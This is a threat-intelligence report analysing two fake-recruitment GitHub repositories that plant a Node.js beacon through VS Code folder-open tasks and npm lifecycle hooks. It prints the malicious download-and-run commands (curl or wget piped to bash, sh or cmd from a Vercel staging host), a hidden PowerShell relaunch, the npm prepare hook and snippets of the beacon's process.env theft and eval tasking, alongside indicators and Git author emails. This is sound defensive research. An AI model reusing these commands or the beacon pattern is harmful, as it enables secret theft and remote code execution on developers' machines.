---
title: "From Gamifly to AjunaVerse and AlchemyMVP: Parallel Weaponization of a Shared Poker Repository Lineage"
date: 2026-06-09
author: "ThreatProphet"
description: "Forensic comparison of two parallel GitHub repositories derived from the Gamifly/BetPoker poker-game lineage. AjunaVerse and AlchemyMVP contain nearly identical current trees, synchronized malicious commits, redundant VS Code and npm execution paths, a cross-platform Vercel staging chain, and an env.npl registrar implant linked to the recurring TCP/1224 /api/checkStatus toolkit."
tags:
  - contagious-interview
  - fake-developer-recruitment
  - github-repository
  - vscode
  - npm
  - javascript
  - node-js
  - vercel
  - stoatwaffle
  - environment-theft
  - backdoor
  - git-forensics
  - dprk-linked
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1204.002
  - T1059.003
  - T1059.004
  - T1059.007
  - T1027
  - T1140
  - T1036
  - T1105
  - T1071.001
  - T1082
  - T1016
  - T1119
  - T1552.001
  - T1041
report_id: "TP-2026-017"
showToc: true
---

> *"The branches diverged; the payload did not."*

## Executive Summary

This report analyzes two GitHub repositories discovered through follow-on hunting after ThreatProphet's investigation of the Interexy-branded `Gamifly` lure:

```text
hxxps://github[.]com/LimitBreak-Solutions/AjunaVerse
hxxps://github[.]com/AlchemyGlobal/AlchemyMVP
```

The repositories were not directly delivered to the investigator during a recruitment interaction. They were identified by pivoting on Git commits, repository structure, poker-game artifacts, VS Code execution patterns, and malware-loader code preserved in the Gamifly lineage. Both were acquired as forensic Git mirrors on June 9, 2026.

AjunaVerse and AlchemyMVP are parallel weaponized branches of the same poker-derived Git history. Their histories share 336 reachable commits and a common merge base at:

```text
386c5a17c8729eb4753d6c8ca063717abfb4d8b5
```

AjunaVerse contains 358 reachable commits and AlchemyMVP 356. Their object databases contain 1,762 and 1,757 reachable objects respectively, of which 1,730 are shared. Although their HEAD commit and tree identifiers differ, the current trees differ only in `README.md`. The operational files—including `.vscode/tasks.json`, `.vscode/settings.json`, `package.json`, `server.js`, `routes/index.js`, `routes/api/auth.js`, and `controllers/auth.js`—are identical Git blobs in both repositories.

The branch histories provide unusually strong evidence of coordinated parallel maintenance. After diverging, the repositories received at least 19 patch-equivalent commits. Several malicious changes were applied at exactly the same recorded second under separate commit objects, while later migration changes were copied between branches within approximately 70–80 minutes. The final Vercel task rotation was committed to AlchemyMVP exactly 60 seconds after the corresponding AjunaVerse change. The pattern is more consistent with a repeatable repository-production workflow than with independent developers coincidentally implementing the same changes.

Both current repositories implement two redundant execution paths:

1. A hidden VS Code `folderOpen` task downloads and executes an operating-system-specific script from `vscode-settings-529[.]vercel[.]app`.
2. A separate `folderOpen` task runs `npm install`, whose `prepare` lifecycle script launches `node server` in the background. The backend imports `routes/api/auth.js`, where an obfuscated registrar/tasking implant is appended directly after the legitimate route export and executes at module load.

The direct staging chain is cross-platform. Linux and macOS receive shell wrappers that download a shared Unix bootstrap, while Windows receives a command wrapper that retrieves `vscode-bootstrap.cmd`. The Windows bootstrap hides its own window, ensures Node.js is available, downloads `env.npl` and a package manifest, installs dependencies, and executes `env.npl` with Node.js.

The Unix chain contains an operational migration error. Its Stage-2 bootstrap was retrieved from `vscode-settings-529[.]vercel[.]app`, but it still downloads its final JavaScript and package files from the older domain:

```text
vscode-settings-422-self[.]vercel[.]app
```

Both legacy endpoints returned HTTP 451 with `X-Vercel-Error: DEPLOYMENT_DISABLED` during collection. Equivalent endpoints on `vscode-settings-529[.]vercel[.]app` remained active. Consequently, the direct Linux/macOS path was impaired by a stale domain reference, while the Windows direct-loader path and the repository-resident npm/backend path remained operational.

The active `env.npl` is a compact obfuscated Node.js registrar/tasking implant. It collects hostname, operating-system details, and a non-loopback MAC address; serializes the complete `process.env`; and sends the data every five seconds to:

```text
hxxp://138.201.128[.]169:1224/api/checkStatus
```

The beacon uses the fields `sysInfo`, `processInfo`, `tid`, and `sysId`. It stores a server-issued `sysId` and executes JavaScript from the response `message` field through `eval()` when the C2 returns `status: "error"`. Its encoded campaign marker is:

```text
bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=
```

Decoded:

```text
now it time to get everything
```

The same `/api/checkStatus` path, TCP port `1224`, beacon schema, five-second interval, conditional `error` task execution, and campaign marker have appeared in earlier related investigations. This combination is a stronger continuity indicator than any single IP address or raw payload hash.

The `env.npl` filename and bootstrap design also overlap public reporting on **StoatWaffle**, a Node.js malware framework attributed by NTT Security Japan to WaterPlum Team 8 within the Contagious Interview ecosystem. Public StoatWaffle reporting describes malicious VS Code `folderOpen` tasks, Vercel-hosted bootstrap scripts, Node.js installation, download and execution of `env.npl`, five-second polling, and JavaScript execution when the server returns an error state. The current sample differs in tasking path, port, fields, and embedded environment exfiltration; therefore, this report treats the overlap as strong tooling/family-context evidence rather than relying on the filename alone for definitive classification.

Technical linkage between AjunaVerse, AlchemyMVP, Gamifly, BetPoker, and the recurring registrar/tasking toolkit is assessed with **high confidence**. Association with the publicly documented StoatWaffle/WaterPlum Team 8 activity is assessed with **medium-to-high confidence** based on the combined delivery architecture, filename, runtime preparation, Node.js loader behavior, and Contagious Interview repository lineage. Attribution to a specific individual remains **low confidence** because Git author fields and repository personas are user-controlled and may be fabricated, shared, or compromised.

## Evidence Basis and Scope

This report is based on:

- forensic Git mirror archives of `LimitBreak-Solutions/AjunaVerse` and `AlchemyGlobal/AlchemyMVP`;
- preserved HEAD, refs, source metadata, and full commit metadata for both repositories;
- Git-object, commit-graph, tree, patch-ID, and file-hash comparison;
- static review of current and historical repository files;
- controlled retrieval of Linux, macOS, and Windows Stage-1 scripts;
- controlled retrieval of the Unix and Windows Stage-2 bootstrap scripts;
- controlled retrieval of current and legacy Stage-3 endpoints;
- static deobfuscation and comparison of the downloaded `env.npl` and repository-embedded beacon;
- comparison with the previously documented Gamifly, BetPoker, and Dravion-style loader architecture;
- comparison with public NTT Security Japan and Ransom-ISAC reporting on StoatWaffle-style VS Code delivery.

No repository, VS Code task, npm lifecycle script, shell script, command script, bootstrap, downloaded Node.js runtime, or `env.npl` payload was executed during analysis. Remote resources were retrieved as inert evidence and analyzed statically.

The investigation did not reproduce the final registrar protocol against `138.201.128[.]169:1224`. The tasking behavior described in this report is directly visible in the recovered code, but no current standby response, server-assigned UUID, or operator-provided post-enrollment task was collected for this C2.

The repositories were discovered through hunting and were not tied to a preserved recruiter persona, interview email, Calendly event, or direct victim-delivery record. Accordingly, this report focuses on repository lineage, maintenance behavior, staging infrastructure, and malware evolution rather than reconstructing a social-engineering engagement.

**Brand-use notice:** `LimitBreak-Solutions`, `AjunaVerse`, `AlchemyGlobal`, and `AlchemyMVP` are observed GitHub organization and repository names. This report does not establish that any legitimate company, project, employee, or similarly named third party created, controlled, or knowingly supported the repositories. The names should be treated as lure branding or potentially misused identities unless independent evidence establishes otherwise.

Claims are separated into:

- **Directly observed:** present in acquired Git objects, captured scripts, response headers, endpoint bodies, hashes, or static code.
- **Behavioral assessment:** inferred from code paths and execution logic without running the malware.
- **External/campaign context:** based on public reporting and prior ThreatProphet cases; used for clustering and comparison, not as sole proof of attribution.

## Key Findings

| Finding | Assessment |
|---|---|
| Repositories | `LimitBreak-Solutions/AjunaVerse` and `AlchemyGlobal/AlchemyMVP` |
| Discovery context | Follow-on hunting from the Gamifly/BetPoker repository lineage |
| AjunaVerse HEAD | `4ca98b1d45548a4ed106ca3218b0acf1295fcc69` |
| AlchemyMVP HEAD | `f00cc7e05b3905c13be10575952761813196c330` |
| Common merge base | `386c5a17c8729eb4753d6c8ca063717abfb4d8b5` |
| Reachable commits | 358 AjunaVerse; 356 AlchemyMVP; 336 shared |
| Reachable objects | 1,762 AjunaVerse; 1,757 AlchemyMVP; 1,730 shared |
| Current tree difference | `README.md` only |
| Identical operational files | VS Code tasks/settings, package manifest, server, routes, controller, embedded beacon |
| Parallel maintenance | At least 19 patch-equivalent post-divergence commits |
| Original application lineage | Poker/Texas Hold'em application inherited from Gamifly/BetPoker history |
| Automatic execution path 1 | VS Code `runOn: folderOpen` direct OS-specific downloader |
| Automatic execution path 2 | VS Code-triggered `npm install` → npm `prepare` → background `node server` |
| Repository-resident implant | Obfuscated code appended to `routes/api/auth.js` and executed at module load |
| Current staging domain | `vscode-settings-529[.]vercel[.]app` |
| Stale Unix staging domain | `vscode-settings-422-self[.]vercel[.]app` |
| Stale-domain status | HTTP 451, `DEPLOYMENT_DISABLED` during collection |
| Downloaded payload filename | `env.npl` on Windows; `env-setup.js` in the stale Unix bootstrap |
| Active final payload | 3,670-byte obfuscated Node.js registrar/tasking implant |
| C2 | `138.201.128[.]169:1224/api/checkStatus` |
| Beacon interval | 5 seconds |
| Campaign marker | `bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=` → `now it time to get everything` |
| Collection | Host profile plus complete `process.env` |
| Task execution | `eval(message)` when status is `error` |
| Prior-case continuity | Exact path/port/protocol/marker overlap with earlier related reports |
| StoatWaffle overlap | VS Code/Vercel/Node bootstrap/`env.npl`/five-second error-tasking architecture |
| Technical cluster confidence | High |
| WaterPlum/Team 8 consistency | Medium-to-high |
| Person-level attribution | Low |

---

## Repository-Lineage Analysis

### Forensic Acquisition

AjunaVerse was acquired as a Git mirror at `2026-06-09T12:32:56Z` with:

```text
Repository: hxxps://github[.]com/LimitBreak-Solutions/AjunaVerse
HEAD:       4ca98b1d45548a4ed106ca3218b0acf1295fcc69
Branch:     refs/heads/master
```

AlchemyMVP was acquired at `2026-06-09T12:35:45Z` with:

```text
Repository: hxxps://github[.]com/AlchemyGlobal/AlchemyMVP
HEAD:       f00cc7e05b3905c13be10575952761813196c330
Branch:     refs/heads/master
```

The compressed archive hashes differ, as expected for separate mirrors with distinct configurations and object packs:

```text
9034946292c3416b7a1ecdf8afbafe44fe84b7db1bf8f769fe98daa49d1ee7b7
  github_limitbreak-solutions_ajunaverse_20260609T123256Z.tar.gz

5e5fe6115210c1f6dd36fae03c6954df40654b034b734fd7489e725f1421422a
  github_alchemyglobal_alchemymvp_20260609T123545Z.tar.gz
```

### Shared Commit and Object Graph

The repositories share the merge base:

```text
386c5a17c8729eb4753d6c8ca063717abfb4d8b5
```

Their reachable commit counts are:

```text
AjunaVerse:  358
AlchemyMVP: 356
Shared:     336
```

Their reachable Git-object counts are:

```text
AjunaVerse:  1,762
AlchemyMVP: 1,757
Shared:     1,730
```

The object overlap proves that the two repositories descend from the same Git history. This is stronger than finding matching source files: shared commit objects encode the same parent relationships, trees, author/committer metadata, timestamps, and messages.

The shared history also contains the exact Gamifly-linked commits:

```text
89da1a9d1e0856957afa2217af2241257ac3670f
  update Users Token | testv1

ce9deb2ec4a745305eadbcdca57d4f5eeedb35f6
  change routes/api/auth.js
```

Those commits anchor AjunaVerse and AlchemyMVP directly to the weaponized poker-derived history examined in TP-2026-016.

### Current Trees Differ Only in Branding

AjunaVerse HEAD tree:

```text
2a0839f1f774a0dc8c67d3411108aa3f8545e995
```

AlchemyMVP HEAD tree:

```text
3fdc25202e244172b45a6b75617aab77ef9a2898
```

A tree-to-tree comparison identified only one changed path:

```text
M README.md
```

The READMEs market different metaverse brands—`AjunaVerse MVP` and `Alchemy_Verse MVP`—but the current executable repository content is otherwise the same.

The following files have identical Git blob IDs and SHA-256 hashes in both repositories:

| File | Git blob | SHA-256 |
|---|---|---|
| `.vscode/tasks.json` | `348c8cf62e8d3ad63c47f087fcc91298407a0859` | `7d75a94a560699c1201574986aa2b6fd5f1e8f397815d36a05ff35d6a4bae8b8` |
| `.vscode/settings.json` | `eb3729146992d6dcefda5ba3b93a0e89ce83abb3` | `1875cdcd577c10d1c7f193a5cba7a4483007274e36dbae493c9babb6a3d44e28` |
| `package.json` | `c9206c496fbfc20b340a1fe4eb15a29dbfc517e5` | `c913a6b89e6f2d51cb9d6b45f75970cf571784453e85b3051b0409dabc1eb2f0` |
| `server.js` | `f66b46398e12d419bbf2a7524d05af265b0a19dd` | `e2d4d02531eb4f325729baaa9adcd4d2785a812657be6875266339d1841aaa8c` |
| `routes/index.js` | `26f00667caa39871e907a8256f391cf7639f0979` | `a9d8ea7c9a396d5c1f04d998f4f3e944c67ec4c88524a05c613bcb1ca0a7eacf` |
| `routes/api/auth.js` | `1e727da8316a1dbf7b61392d89c1558824ab74bb` | `83c0219e78fe9d6d96944d75ece05205c4c45a8ca6cad485750fd816c44f8ae8` |
| `controllers/auth.js` | `7a7d7828255921a0db338f84623a089ca3e533d5` | `c3b743d14e66bf565248cc09230e3eb50c8864ae049a150f654ddce23eae5308` |

The repository names and README text therefore function primarily as branding layers over one current operational artifact set.

### Poker Application Lineage

Both repositories retain the substantive poker application inherited from Gamifly and BetPoker, including:

```text
pokersolver dependency
card and deck objects
player, seat, table and side-pot logic
chip and pot components
poker-flow integration tests
Texas Hold'em-related implementation residue
```

The shared commit history includes subjects such as:

```text
change ChipAmountPill.js
Add Card Class
game logic
fix chips.js
add integration tests for poker game flow
update authentication feature, poker game logic flow
```

The current metaverse branding does not reflect the underlying implementation. The repositories are repurposed poker-game projects used as believable Web3 development lures.

The history also retains the previously observed graft onto an unrelated `tcpie` history. Names and emails from inherited upstream history must not be treated as actor identities.

---

## Parallel Weaponization and Maintenance

### Patch-Equivalent Branch Commits

After the common merge base, the branches received at least 19 patch-equivalent commit pairs. The commits have different hashes because their parents and metadata differ, but their patches are equivalent.

Key examples:

| Function | AjunaVerse commit | AlchemyMVP commit | Timing relationship |
|---|---|---|---|
| Add OS-specific VS Code downloader | `0ef116dba906a96f4d5a53cf78f77ed5944799b6` | `4ce6fcc891eb09d562a4627cb3a1c87576f614de` | Same recorded second |
| Add embedded beacon to auth route | `03e91eaf09cfce2ec6a4b2da6a137598b1590073` | `7111f22de98466503056866f36f578137ecaddfc` | Same recorded second |
| Update server behavior | `0d73c5399bd1729b07902c1ca4b5224461206055` | `c872b53f4cf08e8205ffd7c6cc602f948042a29e` | Same recorded second |
| Delete `.env` | `b9e62916379d5d43188f0a2c96cc15c870af18fd` | `21ba9ef774278815bb438fe4ebe9a836854665c5` | Alchemy approximately 78 minutes later |
| Delete `.env.local` | `0abe12e91444cbd33d382f9d46597e8540d5cb3c` | `aed05220b5da298d5a8223b6b4614efb0393ef70` | Alchemy approximately 78 minutes later |
| Delete `config/loadEnv.js` | `8f44f22c97d8fdb0188c41d7be66679387152612` | `e508354199758d7f29c10ad5494e17182cb69062` | Alchemy approximately 78 minutes later |
| Remove old controller gate | `d8d410df9ee6019de1415e90b1efeb9b93c51f71` | `2b2391466df7cbcc20364997254d054e07dbacc7` | Alchemy approximately 78 minutes later |
| Remove old route validation | `75b6206d71aa93ffa234f1ff01c7fc17f74301c3` | `f08e8a977bd4c773c60ffcd10d0f2ba416915575` | Alchemy approximately 75 minutes later |
| Rotate Vercel task URL | `4ca98b1d45548a4ed106ca3218b0acf1295fcc69` | `f00cc7e05b3905c13be10575952761813196c330` | Alchemy exactly 60 seconds later |

The two May 20 payload commits were authored under the same displayed persona and email at identical timestamps:

```text
GitWorkHub9 <fatihafariya8+2@gmail.com>
```

The later migration was represented differently by branch:

```text
AjunaVerse:
GitWorkHub9 <erick092303@gmail.com>

AlchemyMVP:
AlchemyWorkHub <divanefapibi31@gmail.com>
```

This pattern may indicate separate operational personas assigned to separate lure brands, shared access to multiple accounts, or automated/manual replication of a common patch sequence. Git metadata alone cannot establish which interpretation is correct.

### Migration from the Gamifly Gate

The shared history previously contained the Gamifly-style architecture:

```text
.env and .env.local
config/loadEnv.js
base64 AUTH_API
POST full process.env
x-app-request: ip-check
new Function("require", response.data)
```

The May 28 branch-specific commits removed that delivery path in parallel:

```text
Delete .env
Delete .env.local
Delete config/loadEnv.js
Remove setApiKey and verify from controllers/auth.js
Remove API-key validation from routes/api/auth.js
```

The current auth route still imports `setApiKey` and `verify`, although the controller no longer exports them:

```js
const { getCurrentUser, login, setApiKey, verify } = require('../../controllers/auth');
```

Because the removed functions are not called, destructuring missing properties does not stop execution. The stale import is a clear residue of the earlier Vercel-gated loader design.

The registrar/tasking implant was moved directly into `routes/api/auth.js`, after:

```js
module.exports = router;
```

This causes the implant to execute whenever the route module is loaded, without requiring an HTTP request to the authentication endpoint.

---

## Current Execution Architecture

### High-Level Chain

```text
Open repository in trusted VS Code workspace
  ├─ Task 1: install-root-modules
  │   └─ npm install --silent --no-progress
  │       └─ package.json prepare
  │           └─ background node server
  │               └─ require routes/index.js
  │                   └─ require routes/api/auth.js
  │                       └─ execute embedded registrar implant
  │
  └─ Task 2: env
      └─ download and pipe OS-specific Stage 1
          ├─ Linux -> shell wrapper
          ├─ macOS -> shell wrapper
          └─ Windows -> command wrapper
              └─ download bootstrap
                  └─ ensure Node.js
                      └─ download env.npl/package
                          └─ execute registrar implant
```

The two tasks have no dependency relationship and can run independently. The actor therefore retained a repository-resident implant while adding an external staged downloader that converges on the same functionality.

### VS Code Folder-Open Tasks

The current `.vscode/tasks.json` contains two automatic tasks with:

```json
"runOptions": {
  "runOn": "folderOpen"
}
```

The install task runs:

```text
npm install --silent --no-progress
```

The platform task runs:

```text
macOS:
curl -L 'hxxps://vscode-settings-529[.]vercel[.]app/api/settings/mac' | bash

Linux:
wget -qO- 'hxxps://vscode-settings-529[.]vercel[.]app/api/settings/linux' | sh

Windows:
curl --ssl-no-revoke -L hxxps://vscode-settings-529[.]vercel[.]app/api/settings/windows | cmd
```

Task presentation is set to `reveal: "silent"`, command echo is disabled, focus remains in the editor, and the terminal panel is configured as new/closed. The settings reduce visibility while using legitimate VS Code functionality.

### npm Lifecycle Route

The shared package manifest defines:

```json
"prepare": "start /b node server || nohup node server &"
```

On Windows, `start /b` launches the server in the background. On Unix-like systems, the first command fails and the shell falls through to `nohup node server &`.

`server.js` imports the route tree before beginning to listen:

```js
const configureRoutes = require("./routes");
configureRoutes(app);
```

`routes/index.js` imports `routes/api/auth.js`, and the appended payload executes at import time. The malicious behavior can therefore begin even if the server later encounters an error or chooses a different listening port.

The server implements automatic port incrementing from port 3030 if the selected port is occupied. That behavior may allow multiple server instances created by overlapping execution paths to remain active.

### Repository-Embedded Beacon

The current `routes/api/auth.js` combines legitimate Express route code with a large obfuscated block appended after `module.exports = router`. The payload is present as the same Git blob in both repositories.

The code performs:

- Node.js `os` module loading;
- hostname, OS type, release, platform, and MAC collection;
- complete `process.env` serialization;
- five-second polling;
- server-issued `sysId` storage;
- conditional `eval()` of tasking content.

This path does not depend on Vercel being available after repository acquisition. It only requires the backend to be launched and the registrar C2 to be reachable.

---

## Cross-Platform Staging Analysis

### Stage 1 — Linux

The Linux endpoint returned HTTP 200 and a 324-byte shell script:

```text
hxxps://vscode-settings-529[.]vercel[.]app/api/settings/linux
```

The script:

1. creates `~/.vscode`;
2. downloads `bootstraplinux` as `~/.vscode/vscode-bootstrap.sh`;
3. marks it executable;
4. invokes it with `nohup bash`.

Relevant commands:

```bash
wget -q -O "$HOME/.vscode/vscode-bootstrap.sh" \
  "https://vscode-settings-529.vercel.app/api/settings/bootstraplinux"
chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
nohup bash "$HOME/.vscode/vscode-bootstrap.sh"
```

Despite the use of `nohup`, the script does not append `&`; it therefore does not actually background the process by itself.

### Stage 1 — macOS

The macOS endpoint returned HTTP 200 and a 1,122-byte shell script:

```text
hxxps://vscode-settings-529[.]vercel[.]app/api/settings/mac
```

It performs the same essential action as the Linux wrapper but uses `curl` and more verbose status messages. It also retrieves:

```text
/api/settings/bootstraplinux
```

The same Unix bootstrap is therefore used for both Linux and macOS.

### Stage 1 — Windows

The Windows endpoint returned HTTP 200 and a 396-byte command script:

```text
hxxps://vscode-settings-529[.]vercel[.]app/api/settings/windows
```

The script creates `%USERPROFILE%\.vscode`, downloads the Windows bootstrap, and executes it:

```cmd
curl --ssl-no-revoke -s -L \
  -o "%USERPROFILE%\.vscode\vscode-bootstrap.cmd" \
  https://vscode-settings-529.vercel.app/api/settings/bootstrap

"%USERPROFILE%\.vscode\vscode-bootstrap.cmd"
```

### Stage 2 — Shared Unix Bootstrap

The Unix bootstrap is a 6,477-byte shell script. It:

- detects Linux or macOS;
- uses an existing Node.js installation if available;
- otherwise retrieves the latest Node.js version from the official distribution index;
- downloads and extracts a portable x64 Node.js archive into `~/.vscode`;
- records the current workspace name as `~/.vscode/<workspace>.txt`;
- downloads a JavaScript file and package manifest;
- installs npm dependencies;
- executes the JavaScript with Node.js.

The portable fallback supports `linux-x64` and `darwin-x64` only. Apple Silicon `darwin-arm64` is not handled.

The bootstrap's stated base URL is:

```bash
BASE_URL="https://vscode-settings-422-self.vercel.app/api"
```

It then downloads:

```text
hxxps://vscode-settings-422-self[.]vercel[.]app/api/settings/env
hxxps://vscode-settings-422-self[.]vercel[.]app/api/settings/package
```

The final JavaScript is saved as:

```text
~/.vscode/env-setup.js
```

### Stale-Domain Migration Error

Both `vscode-settings-422-self` endpoints returned:

```text
HTTP/1.1 451 Unavailable For Legal Reasons
X-Vercel-Error: DEPLOYMENT_DISABLED
```

Response body:

```text
This content has been blocked for legal reasons

DEPLOYMENT_DISABLED
```

The corresponding endpoints on `vscode-settings-529` returned valid payload content during the same collection period.

The surrounding repository and Stage-1 scripts had already migrated to `vscode-settings-529`, while the Unix Stage-2 bootstrap still referenced `vscode-settings-422-self`. This is most consistent with an incomplete infrastructure update.

The failure mode depends on the available downloader:

- With `wget`, HTTP failure normally returns a non-zero exit code; because the script uses `set -e`, execution is likely to terminate immediately.
- With `curl`, the script does not use `--fail`; the HTTP 451 body may be saved as `env-setup.js` and `package.json`. npm parsing or Node.js execution would then fail later.

This selectively impairs the direct Linux/macOS chain. It does not disable the repository-embedded beacon launched through npm `prepare`.

### Stage 2 — Windows Bootstrap

The Windows bootstrap is a 3,832-byte command script. It first restarts itself through a hidden `cmd.exe` window:

```cmd
powershell -WindowStyle Hidden -Command ^
  "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden"
```

It then:

1. obtains the latest Node.js version from `nodejs.org/dist/index.json`;
2. uses a global Node.js installation if present;
3. otherwise downloads the current x64 MSI from the official Node.js site;
4. performs an administrative extraction into a local `nodejs` directory;
5. stores the workspace folder name under `%USERPROFILE%\.vscode`;
6. downloads `env.npl` and `package.json` from `vscode-settings-529`;
7. installs the `request` dependency;
8. executes `env.npl` with Node.js.

Unlike the Unix bootstrap, the Windows script uses the current `529` deployment for the final stage and was functional at collection time.

### Stage 3 — Package Manifest

The active package endpoint returned:

```json
{
  "name": "env",
  "version": "1.0.0",
  "private": true,
  "dependencies": {
    "axios": "^1.10.0",
    "request": "^2.88.2"
  },
  "scripts": {
    "start": "node env.npl"
  }
}
```

The current `env.npl` implementation uses native `fetch()` and does not require `axios` or `request`. The dependencies likely reflect residue from earlier loader generations or support for alternate payloads served from the same staging framework.

### Stage 3 — `env.npl`

The active environment endpoint returned a 3,670-byte obfuscated Node.js file with content type `application/octet-stream`.

Its SHA-256 hash is:

```text
b7a038af5b373a31342bda13b199a539dedc56c41039d2a695728239700ae005
```

The filename `env.npl` is noteworthy. Public NTT Security Japan reporting on StoatWaffle describes a VS Code/Vercel bootstrap that ensures Node.js, downloads `env.npl` and `package.json`, and executes `env.npl` as the initial Node.js downloader. Ransom-ISAC independently documented the same filename and general five-second error-tasking design in a separate fake-interview repository investigation.

The filename is not a standard Node.js extension and has no technical requirement; Node.js executes the file because it is passed explicitly to the runtime. Its repeated use is therefore a useful malware-development and campaign pivot.

---

## Registrar/Tasking Implant Analysis

### Static Deobfuscation

The payload uses:

- a rotated encoded string array;
- a custom Base64-style decoder;
- runtime string caching;
- an additional standard Base64 layer for the C2 URL.

Static decoding recovered:

```text
C2:
hxxp://138.201.128[.]169:1224/api/checkStatus

Encoded tid:
bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=

Decoded tid:
now it time to get everything

Interval:
0x1388 = 5000 milliseconds
```

### Host Profiling

The implant collects:

```text
hostname
OS type
OS release
Node platform identifier
first non-internal IPv4 MAC address that is not 00:00:00:00:00:00
```

The host record is equivalent to:

```js
{
  hostname,
  macs: [mac],
  os: `${type} ${release} (${platform})`
}
```

### Environment Collection

Every beacon serializes:

```js
JSON.stringify(process.env)
```

The complete inherited environment can contain:

- cloud credentials;
- Git and package-registry tokens;
- CI/CD secrets;
- database credentials;
- wallet or Web3 RPC keys;
- payment-provider credentials;
- API keys;
- proxy settings;
- local paths and user identifiers.

This collection is sent repeatedly, not only at initial enrollment.

### Tasking Protocol

The query fields are:

```text
sysInfo
processInfo
tid
sysId
```

The response is parsed as:

```js
const { status, message, sysId } = await response.json();
```

If `status === "error"`, the payload executes:

```js
eval(message)
```

If a `sysId` is returned, it replaces the initial value of `0`. The implant runs once immediately and then every five seconds.

The `error` state acts as a disguised command-execution branch. The C2 can return arbitrary JavaScript in `message`, giving the operator access to Node.js APIs available in the current process.

### Downloaded and Embedded Copies Converge

The payload embedded in `routes/api/auth.js` and the downloaded `env.npl` are not byte-identical because one represents two spaces in the OS string as `\x20` escapes while the other uses literal spaces. After formatting, this is the only substantive textual difference identified in the payload bodies.

They are functionally equivalent and use the same:

```text
obfuscation structure
string table
C2 URL
campaign marker
query schema
five-second interval
host collection
process.env collection
conditional eval tasking
```

Both execution routes therefore converge on the same registrar/tasking capability.

---

## Evolution from Gamifly

### Gamifly Generation

TP-2026-016 documented a repository-integrated gate:

```text
folderOpen/npm install
  -> node server.js
  -> load .env and .env.local
  -> fake API-key validation
  -> POST full process.env to Vercel
  -> execute returned JavaScript through new Function
  -> registrar beacon on TCP/1224
```

### AjunaVerse/AlchemyMVP Generation

The newer branches remove the old environment gate and implement:

```text
Path A:
npm install
  -> prepare
  -> node server
  -> embedded beacon in auth route

Path B:
folderOpen
  -> OS-specific Vercel downloader
  -> Node.js bootstrap
  -> env.npl
  -> same beacon
```

The changes provide redundancy and reduce dependence on one Vercel gate. The registrar payload is now already present inside the repository, while the downloader offers a second route that can be changed independently at the hosting layer.

### Stable Toolkit Markers

Across the related cases, the most stable markers are not the C2 IP addresses. They are:

```text
TCP port 1224
/api/checkStatus
sysInfo
processInfo
tid
sysId
five-second polling
server-assigned enrollment ID
status == "error"
JavaScript execution from message
```

The current campaign marker:

```text
bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=
```

has also appeared in earlier reporting associated with the same registrar/tasking implementation. This exact protocol-plus-marker combination is a high-value cluster pivot.

---

## Relationship to Public StoatWaffle Reporting

NTT Security Japan published its StoatWaffle analysis on March 17, 2026. The report describes WaterPlum Team 8 using blockchain-themed repositories with `.vscode/tasks.json` and `runOn: folderOpen`, Vercel staging, automatic Node.js preparation, download of `env.npl` and `package.json`, and five-second C2 polling. The initial loader executes server-provided Node.js code when the response status indicates an error.

Ransom-ISAC documented a related fake-interview chain on March 16, 2026, including:

```text
VS Code folder-open execution
Vercel staging
Node.js host profiling
five-second tasking
status "error" remote JavaScript execution
env.npl as a recovered loader artifact
```

The current AjunaVerse/AlchemyMVP chain shares the following distinctive elements:

| Element | Public StoatWaffle reporting | Current case |
|---|---|---|
| Blockchain/Web3 decoy repository | Yes | Yes |
| VS Code `folderOpen` | Yes | Yes |
| Vercel Stage 1 | Yes | Yes |
| Node.js availability bootstrap | Yes | Yes |
| `env.npl` filename | Yes | Yes, Windows path |
| Five-second polling | Yes | Yes |
| Execute response when status is `error` | Yes | Yes |
| Host profiling | Yes | Yes |
| Modular post-enrollment tasking | Yes | Supported by arbitrary JavaScript tasking |
| Publicly reported C2 path | `/api/errorMessage` | `/api/checkStatus` |
| Publicly reported port | 3000 | 1224 |
| Complete `process.env` exfiltration | Not central to cited public loader | Present in every beacon |

The overlap is stronger than a generic use of VS Code tasks. The same unusual payload filename, runtime preparation sequence, staging model, polling interval, response semantics, and Node.js task execution are present.

However, the differences matter. The current loader uses a different endpoint path, field names, C2 port, campaign marker, and environment-exfiltration behavior. This report therefore assesses the current implant as a **StoatWaffle-style or likely related loader variant within the same broader WaterPlum/Contagious Interview tooling ecosystem**, rather than claiming that the current bytes are identical to a publicly named StoatWaffle sample.

---

## Infrastructure Analysis

### Active Vercel Infrastructure

| Indicator | Role | Status during collection |
|---|---|---|
| `vscode-settings-529[.]vercel[.]app` | Current staging application | Active |
| `/api/settings/linux` | Linux Stage 1 | HTTP 200 |
| `/api/settings/mac` | macOS Stage 1 | HTTP 200 |
| `/api/settings/windows` | Windows Stage 1 | HTTP 200 |
| `/api/settings/bootstraplinux` | Shared Unix Stage 2 | HTTP 200 |
| `/api/settings/bootstrap` | Windows Stage 2 | HTTP 200 |
| `/api/settings/env` | Active `env.npl` payload | HTTP 200 |
| `/api/settings/package` | Active package manifest | HTTP 200 |

Vercel is a legitimate hosting provider. The indicators describe abuse of a deployment, not provider participation.

### Disabled Legacy Infrastructure

| Indicator | Role | Observed response |
|---|---|---|
| `vscode-settings-422-self[.]vercel[.]app/api/settings/env` | Stale Unix final payload | HTTP 451, `DEPLOYMENT_DISABLED` |
| `vscode-settings-422-self[.]vercel[.]app/api/settings/package` | Stale Unix package manifest | HTTP 451, `DEPLOYMENT_DISABLED` |

The response confirms that the deployment was unavailable at collection time. It does not by itself establish who disabled it or why.

### Registrar Infrastructure

```text
138.201.128[.]169
138.201.128[.]169:1224
hxxp://138.201.128[.]169:1224/api/checkStatus
```

The C2 IP is embedded in both the repository-resident and downloaded payloads. Its live service state was not independently validated in this investigation.

---

## Git Metadata and Identity Cautions

The post-divergence histories contain names and emails including:

```text
GitWorkHub9 <erick092303@gmail.com>
GitWorkHub9 <fatihafariya8+2@gmail.com>
AlchemyWorkHub <divanefapibi31@gmail.com>
divanefapibi31-alt <divanefapibi31@gmail.com>
robertferrero0904-ui <robertferrero0904@gmail.com>
roamanbuild <luistech.0924@gmail.com>
